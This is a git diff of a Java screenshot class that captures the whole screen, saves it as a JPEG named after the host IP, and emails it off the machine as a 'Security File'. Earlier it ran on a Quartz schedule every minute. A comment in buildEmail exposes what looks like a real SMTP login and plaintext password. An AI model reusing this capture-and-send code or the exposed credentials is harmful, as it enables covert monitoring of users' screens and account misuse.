@@ -11,34 +11,27 @@ import java.net.Inet4Address;
 import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.SQLException;
 
 import javax.imageio.ImageIO;
 
 import org.apache.commons.mail.EmailException;
 import org.apache.commons.mail.MultiPartEmail;
 import org.joda.time.DateTime;
-import org.quartz.Job;
-import org.quartz.JobBuilder;
-import org.quartz.JobDetail;
-import org.quartz.JobExecutionContext;
-import org.quartz.JobExecutionException;
-import org.quartz.Scheduler;
-import org.quartz.SchedulerException;
-import org.quartz.SimpleScheduleBuilder;
-import org.quartz.Trigger;
-import org.quartz.TriggerBuilder;
-import org.quartz.impl.StdSchedulerFactory;
 
 
 
-public class ScreenTaker implements Job{
+public class ScreenTaker{
 	
 	private String IP;
 	private String HostName;
 	private Robot robot;
 	private Config conf;
 	private File output;
-	private String date;
+	//private String date;
+	//private Scheduler scheduler;
 
 	
 	private void setNetworkData() throws UnknownHostException{
@@ -97,7 +90,7 @@ public class ScreenTaker implements Job{
 		}
 	}
 	
-	public BufferedImage capture(){
+	private BufferedImage capture(){
 		System.out.println("Capturing Image......");
 		BufferedImage img = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
 		System.out.println("Captured Image.......");
@@ -122,8 +115,9 @@ public class ScreenTaker implements Job{
 	
 	
 	 public static void main(String[] args){
+		 /*
 		 try {
-			Scheduler scheduler = StdSchedulerFactory.getDefaultScheduler();	
+			scheduler = StdSchedulerFactory.getDefaultScheduler();	
 			scheduler.start();
 			System.out.println("New Job");
 			JobDetail job = JobBuilder.newJob(ScreenTaker.class).build();
@@ -131,35 +125,26 @@ public class ScreenTaker implements Job{
 					.withSchedule(SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(60).repeatForever())
 					.build();
 			scheduler.scheduleJob(job,trigger);
+			
+			
+			
 			//scheduler.shutdown();
 
 		} catch (SchedulerException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		}
+		}*/
+		 
 	 }
 
-	@Override
-	public void execute(JobExecutionContext arg0) throws JobExecutionException {
-		// TODO Auto-generated method stub
-		date = DateTime.now().toString();
-		System.out.println("Creating snapshot");
-		createScreenshot();
-		buildEmail();
-		
-	}
-
-	private void createScreenshot() {
-		try {
+	
+	
+	
+	public void createScreenshot() throws IOException {
 			Path tempFile = Files.createTempFile(getIP(),".jpg");
 			output = tempFile.toFile();
 			ImageIO.write(capture(),"jpg", output);
 			System.out.println("FileName :-> " + output.getName());
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			System.out.println(e.getMessage());
-		}
-
 	}
 
 	
@@ -171,37 +156,55 @@ public class ScreenTaker implements Job{
 		this.output = output;
 	}
 
-	public String getDate() {
-		return date;
-	}
-
-	public void setDate(String date) {
-		this.date = date;
-	}
-
-	private void buildEmail() {
+	public void buildEmail() throws EmailException {
 		// TODO Auto-generated method stub
 		System.out.println("Sending Email.......");
 		MultiPartEmail email = new MultiPartEmail();
 		email.setHostName(conf.getEmail_config().getDomain()); //smtp.sunset.com.mx
 		email.setSmtpPort(conf.getEmail_config().getPort()); //587
 		email.setAuthentication(conf.getEmail_config().getEmail_usr(),conf.getEmail_config().getEmail_pwd()); //"eosorio@sunset.com.mx","Sys73xrv21"
-		try {
 			email.addTo(conf.getEmail_config().getEmail_to_send());
 			email.setFrom("security@sunset.com.mx","Security Team");
 			email.setSubject("Security File");
-			email.setMsg("Security log from : ->>>>"+ getIP()+" --> "+ date);
+			email.setMsg("Security log from : ->>>>"+ getIP()+" --> "+ DateTime.now().toString());
 			email.attach(output);
 			email.send();
 			System.out.println("Email Sent");
 			output.delete();
 			System.out.println("Deleted File");
-		} catch (EmailException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
+	}
+
+	public void storeDB() throws InstantiationException, IllegalAccessException, ClassNotFoundException{
+		Class.forName("com.mysql.jdbc.Driver").newInstance();
+		
+		
+	}
+
+	
+	/*
+	@Override
+	public void execute(JobExecutionContext arg0) throws JobExecutionException {
+		// TODO Auto-generated method stub
+		date = DateTime.now().toString();
+		System.out.println("Creating snapshot");
+		createScreenshot();
+		buildEmail();
+		
+	}
+	
+	
+	public void interrupt(JobKey key) throws UnableToInterruptJobException {
+		// TODO Auto-generated method stub
+		
 	}
 
 
+	@Override
+	public void interrupt() throws UnableToInterruptJobException {
+		// TODO Auto-generated method stub
+		
+	}
+
+	*/
 	
 }
